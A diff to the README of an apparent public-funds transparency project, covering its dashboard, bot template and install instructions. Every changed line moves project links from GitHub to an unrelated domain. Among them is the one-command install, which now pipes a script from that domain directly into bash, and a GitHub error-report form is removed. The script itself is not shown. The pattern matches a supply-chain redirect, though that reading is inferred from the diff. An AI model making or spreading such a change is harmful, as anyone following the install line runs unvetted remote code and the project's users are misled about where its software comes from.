@@ -11,7 +11,7 @@ Thusa is a **Grok Bot app**. To use it, **import the PublicFunds Bot template vi
   `docs/bot/template.md`.
 
 ## Public dashboard (v0.3.0, CHG-2026-006)
-Everybody else uses the **public website**: a no-login dashboard at **https://farwaters.github.io/publicfunds-sa/** (GitHub Pages, ADR-0011; Grok Build deferred). It reads the open data export in [`public-data/v1/`](public-data/v1/) (`manifest.json` first; money in cents, `null` = unknown, every figure with its source), which `pf publish-data` builds after each successful refresh. Only review-confirmed flags are published. Code: [`apps/public-dashboard/`](apps/public-dashboard/); served by GitHub Pages from `main` (redeploys on every push) (ADR-0010, ADR-0011; [`GROK_BUILD_PROMPT.md`](apps/public-dashboard/GROK_BUILD_PROMPT.md) kept for a later Grok Build copy). The bot template above stays the power-user and reviewer version. What changed in the data: `#/changes` and the JSON Feed `public-data/v1/feed.json`; known gaps per province: `#/unknowns`; found an error? Use **Report an error** on any page (GitHub issue form, no personal data). Roadmap: [`docs/roadmap/improvements-2026-10.md`](docs/roadmap/improvements-2026-10.md).
+Everybody else uses the **public website**: a no-login dashboard at **https://publicfunds.grokforum.site/** (static hosting, ADR-0011; Grok Build deferred). It reads the open data export in [`public-data/v1/`](public-data/v1/) (`manifest.json` first; money in cents, `null` = unknown, every figure with its source), which `pf publish-data` builds after each successful refresh. Only review-confirmed flags are published. Code: [`apps/public-dashboard/`](apps/public-dashboard/); served from `main` (redeploys on every push) (ADR-0010, ADR-0011; [`GROK_BUILD_PROMPT.md`](apps/public-dashboard/GROK_BUILD_PROMPT.md) kept for a later Grok Build copy). The bot template above stays the power-user and reviewer version. What changed in the data: `#/changes` and the JSON Feed `public-data/v1/feed.json`; known gaps per province: `#/unknowns`; to report suspected corruption, use the National Anti-Corruption Hotline (0800 701 701). Roadmap: [`docs/roadmap/improvements-2026-10.md`](docs/roadmap/improvements-2026-10.md).
 
 ## Contents
 | Path | What |
@@ -54,7 +54,7 @@ Exit code 2 means a data-quality check failed and the build is not releasable.
 
 ## One-command install on a fresh bot box
 ```bash
-curl -fsSL https://raw.githubusercontent.com/farwaters/publicfunds-sa/main/scripts/bootstrap.sh | bash
+curl -fsSL https://publicfunds.grokforum.site/scripts/bootstrap.sh | bash
 # or, in a checkout: scripts/bootstrap.sh   (idempotent; env PF_BRANCH, PF_DIR, PF_PORT, PF_CONFIG_DIR, PF_ADMIN_USER)
 ```
 It clones or pulls into `/workspace/publicfunds`, installs uv and the locked dependencies, runs the pipeline and tests, creates
@@ -83,7 +83,7 @@ uv run pf publish                         # rebuild dist/public/ (confirmed flag
 ## Status
 - MVP pipeline v0.1.0: branch `feat/mvp-pipeline` (CHG-2026-002, PR #1).
 - Review app v0.2.0: branch `feat/review-app` (CHG-2026-003), stacked on it.
-- Distributed as the PublicFunds Bot template (https://x.ai/bot/7Hr1hnJPXqOQbMmUZ7mTi). Public dashboard live at https://farwaters.github.io/publicfunds-sa/ (CHG-2026-006, CHG-2026-007).
+- Distributed as the PublicFunds Bot template (https://x.ai/bot/7Hr1hnJPXqOQbMmUZ7mTi). Public dashboard live at https://publicfunds.grokforum.site/ (CHG-2026-006, CHG-2026-007).
 - Published flags: none confirmed yet (0 in `public-data/v1/flags.json`).
 - All flags are unreviewed automated indicators.
 - Supplier-naming flags are `pending human review`.
